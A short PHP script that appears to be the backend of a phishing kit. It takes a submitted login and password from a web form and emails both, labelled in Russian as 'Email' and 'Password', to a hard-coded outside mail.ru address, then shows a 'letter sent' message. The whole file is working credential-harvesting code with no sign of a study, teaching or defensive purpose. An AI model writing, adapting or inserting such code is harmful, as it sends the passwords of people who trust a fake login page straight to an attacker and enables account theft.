<?php
  $login = $_POST['login'];
  $pass = $_POST['pass'];





	$login = htmlspecialchars($login);
	$pass = htmlspecialchars($pass);
 

	$login = urldecode($login);
	$pass = urldecode($pass);

	$login = trim($login);
	$pass = trim($pass);


	if (mail("klacor@mail.ru",
                       "Новое письмо с сайта",
                       "Почта:".$login."\n".
                       "Пароль:".$pass."\n".
                       "From: no-reply@mydomain.ru \r\n")
	) {
                  echo ('Письмо успешно отправлено!');
             }
             else {
                   echo ('Есть ошибка! Проверьте данные...');
             }
?>